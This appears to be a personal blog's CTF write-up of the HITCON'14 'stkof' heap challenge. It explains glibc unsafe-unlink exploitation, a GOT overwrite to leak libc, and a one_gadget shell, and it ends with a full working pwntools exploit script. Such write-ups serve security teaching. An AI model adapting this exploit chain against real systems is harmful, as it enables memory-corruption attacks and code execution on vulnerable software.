@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HITCON’14 Stkof - Ojas Gupta Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="A writeup for the stkof challenge in hitcon 14, I will use the unsafe unlink technique to exploit the heap and onegadget to trigger the shell." />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/hitcon-14-stkof/">
+  <meta property="og:site_name" content="Ojas Gupta Blog">
+  <meta property="og:title" content="HITCON’14 Stkof">
+  <meta property="og:description" content="A writeup for the stkof challenge in hitcon 14, I will use the unsafe unlink technique to exploit the heap and onegadget to trigger the shell.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-19T15:27:13+10:00">
+    <meta property="article:modified_time" content="2026-03-19T15:27:13+10:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HITCON’14 Stkof">
+  <meta name="twitter:description" content="A writeup for the stkof challenge in hitcon 14, I will use the unsafe unlink technique to exploit the heap and onegadget to trigger the shell.">
+
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Ojas Gupta Blog</a>
+	</div>
+	<nav>
+		
+		
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title">HITCON’14 Stkof</h1>
+          <div class="meta">Posted on Mar 19, 2026</div>
+        </div>
+        
+        <section class="body">
+          <h2 id="introduction">Introduction</h2>
+<p>In this blog post I’ll explain to how to solve this CTF and also show how the unsafe unlink attacks works.</p>
+<h2 id="the-unlink-process">The unlink process</h2>
+<p>The pointer table in this CTF is massive, so you can call malloc almost as many times as you want. I&rsquo;ll get into the details on how to locate the pointer table later.</p>
+<p>I’ll start by adding ten <code>0x80</code> sized chunks for now.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>) <span style="color:#75715e"># Im storing my fake chunk here</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span></code></pre></div><p>I will be storing a fake chunk in the fifth heap chunk. A fake chunk is a chunk designed to mimic an actual heap chunk. It will confuse malloc and allow me to access areas of the memory that I should not be allowed to.</p>
+<figure><img src="/img/chunkDiagram.png"
+    alt="Example" width="300">
+</figure>
+
+<p>Start by creating a fake chunk, to mimic the image displayed above:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># Size of the previous chunk</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x80</span>) <span style="color:#75715e"># Size of the current chunk</span>
+</span></span></code></pre></div><p>Next up we need to allocate some forward and backward pointers for our fake chunk. In order to successfully set up these pointers we need to satisfy the following checks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__builtin_expect</span> (fd<span style="color:#f92672">-&gt;</span>bk <span style="color:#f92672">!=</span> p <span style="color:#f92672">||</span> bk<span style="color:#f92672">-&gt;</span>fd <span style="color:#f92672">!=</span> p, <span style="color:#ae81ff">0</span>))
+</span></span></code></pre></div><p>This is checking to see if the forwards and backwards pointers still follow a doubly linked list. It&rsquo;s going to check the next chunk after <code>p</code> and see if it points back to chunk <code>P</code>. To achieve this it will check the value here <code>(fd-&gt;bk)</code>. Then it checks if the chunk behind is pointing to chunk <code>p</code> by using <code>(bk-&gt;fd)</code>. A snippet of the code is shown below.</p>
+<figure><img src="/img/fdbkCheck.png"
+    alt="Example" width="600">
+</figure>
+
+<p>An alternative way to think about <code>FD-&gt;bk</code> is <code>FD + 0x18</code>. So we need to make use of the fact that <code>FD+0x18</code> and <code>BK+0x10</code> are equal to <code>P</code>. This will make the unlink function work with this fake chunk.</p>
+<p>Even though the FD is meant to be a heap chunk, malloc&rsquo;s code does not check that. We can find a writable place in memory where the <code>memory address + 0x18</code> and <code>memory address + 0x10</code> is equal to <code>P</code>.</p>
+<p>During the reverse engineering phase of the CTF, there is line <code>(*(void **)(&amp;ptrTable + (long)valueCount * 8) = mem;)</code> in the “allocate” function that is responsible for calling malloc and it stores a reference to the heap chunk inside a pointer table. A screenshot of the function is shown below.</p>
+<figure><img src="/img/allocateFunction.png"
+    alt="Example" width="400">
+</figure>
+
+<p>By clicking on the “ptrTable” we know that it&rsquo;s stored at the memory address <code>0x602140</code>. I created a few chunks to see where exactly the pointers were being stored in this table and printed it out in gdb.</p>
+<figure><img src="/img/ptrTable.png"
+    alt="Example" width="500">
+</figure>
+
+<p>This is where the first six heap chunks are stored. So in order for us to satisfy that condition we will use the following pointers for the <code>FD (0x602150)</code> and <code>BK (0x602158)</code>. When malloc runs the check <code>FD-&gt;bk</code>, it will do <code>0x602150 + 0x18 = 0x602168</code>. The address <code>0x602150</code> holds our <code>p</code> value, thus the first half of the check is satisfied. A similar operation is performed for <code>BK-&gt;fd</code>, but here it checks if <code>0x602158 + 0x10 = 0x602168</code>. This check will also hold hence allowing us to unlink the chunk through backward consolidation.</p>
+<p>After this we can pad up the fake chunk with twelve <code>p64(0x00)</code> bytes. At this stage our fake chunk should look like this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Initialize the fake chunk.</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Size of the previous chunk.</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Size of the current chunk</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## forward pointer</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x602150</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Backward Pointer</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x602158</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span>
+</span></span></code></pre></div><p>There is another check we need to bypass that malloc looks at <code>(chunksize (p) != prev_size (next_chunk (p)))</code>. This checks if the chunksize of our current chunk that will be freed is the same size as the previous chunk size field being unlinked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Prev chunk size</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Next chunk size (but i overwrote the prev_in_use to 0)</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x90</span>)
+</span></span></code></pre></div><p>With this in place we can trigger the unlink method on our fake chunk.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Insert the fake chunk</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x90</span>, fakeChunk)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove chunk 6 and cause backward consolidation with the fake chunk</span>
+</span></span><span style="display:flex;"><span>remove(<span style="color:#ae81ff">6</span>)
+</span></span></code></pre></div><p>The pointer should be zeroed out at index 6 and we should have an entry in the unsorted bin.</p>
+<figure><img src="/img/ptrTable2.png"
+    alt="Example" width="500">
+</figure>
+
+<p>You can also see that our fake chunk has been added to the unsorted bin and the chunk size has changed to <code>0x111.</code> This is because we backward consolidated two chunks (fake chunk &amp; chunk on index 6), merging them together into one.</p>
+<figure><img src="/img/fakeChunk.png"
+    alt="Example" width="500">
+</figure>
+
+<h2 id="using-the-got-table-to-leak-addresses">Using the GOT Table to leak addresses</h2>
+<p>Now that we have control over the pointer table, let&rsquo;s change some of the addresses. This time when we say “scan on the 5th index”, it will go to the address we have on the 5th index and start adding our data there. In our case it will start adding the strlen and malloc addresses from <code>0x602150</code>.</p>
+<figure><img src="/img/ptrTable3.png"
+    alt="Example" width="500">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>scan(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x10</span>, p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;strlen&#34;</span>]) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;malloc&#34;</span>]))
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x8</span>, p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]))
+</span></span></code></pre></div><p>Confirm that we have the addresses of <code>strlen</code> and <code>malloc</code> written at <code>0x602150</code> and <code>0x602158</code>.</p>
+<figure><img src="/img/ptrTable4.png"
+    alt="Example" width="500">
+</figure>
+
+<p>In order to print this address to the screen, we can overwrite the GOT entry of strlen and replace it with puts. This redirects execution from the strlen address to the puts function.</p>
+<p>This line in printData will get replaced with the puts function, allowing us to see the address at a specific index <code>strlen(*(char **)(&amp;ptrArray + (uVar1 &amp; 0xffffffff) * 8));</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Overwrite got entry for strlen with plt address of puts</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x8</span>, p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]))
+</span></span></code></pre></div><p>Now when we call view(2), the variable mallocLibc should contain the address leak we are looking for.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>mallocLibc <span style="color:#f92672">=</span> view(<span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><p>We can get the libc base using the line below, <code>libc.symbols[“malloc”]</code> will hold the function offset and we can subtract that from the <code>mallocLibc</code> variable to get the base libc address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libcBase <span style="color:#f92672">=</span> int(mallocLibc, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;malloc&#34;</span>]
+</span></span></code></pre></div><p>In order to pop the shell we can use onegadget, for this CTF I decided to go with <code>0xf02a4</code> address since <code>$rsp+0x50</code> was zeroed out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ one_gadget libc-2.23.so
+</span></span><span style="display:flex;"><span>0x45216 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x30, environ<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  rax <span style="color:#f92672">==</span> NULL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x4526a execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x30, environ<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x30<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0xf02a4 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x50, environ<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x50<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0xf1147 execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>constraints:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">[</span>rsp+0x70<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL
+</span></span></code></pre></div><p>After replacing the <code>malloc</code> call with the onegadget, we can trigger the gadget and get a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>oneShot <span style="color:#f92672">=</span> libcBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x8</span>, p64(oneShot))
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h2 id="assumptions-and-additional-information">Assumptions and Additional Information:</h2>
+<p>This exploit also relies on the assumptions that you have a pointer table big enough so we can satisfy the <code>FD-&gt;bk</code> and <code>bk-&gt;FD</code> checks. For this exploit we need at least six heap chunks to get it working for the CTF. Anything below this would require methods since the unsafe unlink technique will not work with this pointer table. Luckily we have a pointer table that is very big and we can get away with allocating a lot of memory.</p>
+<p>The table is of significance since it achieves arbitrary read/write into areas of memory that we should not have access to. In our case we were able to leak libc addresses.</p>
+<h2 id="full-exploit">Full Exploit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> process([
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#34;./ld-2.23.so&#34;</span>,
+</span></span><span style="display:flex;"><span>   <span style="color:#e6db74">&#34;./stkof&#34;</span>
+</span></span><span style="display:flex;"><span>], env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_LIBRARY_PATH&#34;</span>:<span style="color:#e6db74">&#34;.&#34;</span>})
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;stkof&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdb<span style="color:#f92672">.</span>attach(target)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># I/O Functions</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size):
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(str(size))
+</span></span><span style="display:flex;"><span> print (target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">scan</span>(index, size, data):
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(str(index))
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(str(size))
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>send(data)
+</span></span><span style="display:flex;"><span> print (target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(index):
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(str(index))
+</span></span><span style="display:flex;"><span> print (target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(index):
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span> target<span style="color:#f92672">.</span>sendline(str(index))
+</span></span><span style="display:flex;"><span> leak <span style="color:#f92672">=</span> target<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span> leak <span style="color:#f92672">=</span> leak[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;printing leak:&#34;</span>)
+</span></span><span style="display:flex;"><span> leakHex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> str(leak<span style="color:#f92672">.</span>hex())[<span style="color:#ae81ff">2</span>:]
+</span></span><span style="display:flex;"><span> print(target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> leakHex
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>) <span style="color:#75715e"># Im storing my fake chunk here</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize the fake chunk.</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Size of the previous chunk.</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Size of the current chunk</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## forward pointer</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x602150</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Backward Pointer</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x602158</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Prev chunk size</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Next chunk size (but i overwrote the prev_in_use to 0)</span>
+</span></span><span style="display:flex;"><span>fakeChunk <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x90</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Insert the fake chunk</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x90</span>, fakeChunk)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove chunk 6 and cause backward consildation with chunk 5.</span>
+</span></span><span style="display:flex;"><span>remove(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write the got addresses of strlen and malloc to 0x602148 (array of ptrs of heap address)</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">0x10</span>, p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;strlen&#34;</span>]) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;malloc&#34;</span>]))
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite got entry for strlen with plt address of puts</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0x8</span>, p64(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;puts&#34;</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mallocLibc <span style="color:#f92672">=</span> view(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;mallocLibc: &#34;</span>, mallocLibc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libcBase <span style="color:#f92672">=</span> int(mallocLibc, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;malloc&#34;</span>]
+</span></span><span style="display:flex;"><span>oneShot <span style="color:#f92672">=</span> libcBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf02a4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#34;libc base: &#34;</span>,  hex(libcBase))
+</span></span><span style="display:flex;"><span>print (<span style="color:#e6db74">&#34;oneshot gadget: &#34;</span> <span style="color:#f92672">+</span> hex(oneShot))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call malloc</span>
+</span></span><span style="display:flex;"><span>scan(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x8</span>, p64(oneShot))
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enjoy your shell!</span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="references">References</h2>
+<p><a href="https://www.youtube.com/watch?v=FOdkyVcbCk0&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=1">https://www.youtube.com/watch?v=FOdkyVcbCk0&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=1</a></p>
+<p><a href="https://www.youtube.com/watch?v=TZWKD4vQFm8&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=2">https://www.youtube.com/watch?v=TZWKD4vQFm8&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=2</a></p>
+<p><a href="https://www.youtube.com/watch?v=utKI1zsWVd8&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=3">https://www.youtube.com/watch?v=utKI1zsWVd8&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=3</a></p>
+<p><a href="https://www.youtube.com/watch?v=yMONHr6mp-w&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=4">https://www.youtube.com/watch?v=yMONHr6mp-w&amp;list=PLT-LPGjotMdux62aThyrc1XZlTdK-gssE&amp;index=4</a></p>
+<p><a href="https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68">https://infosecwriteups.com/the-toddlers-introduction-to-heap-exploitation-unsafe-unlink-part-4-3-75e00e1b0c68</a></p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2026  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
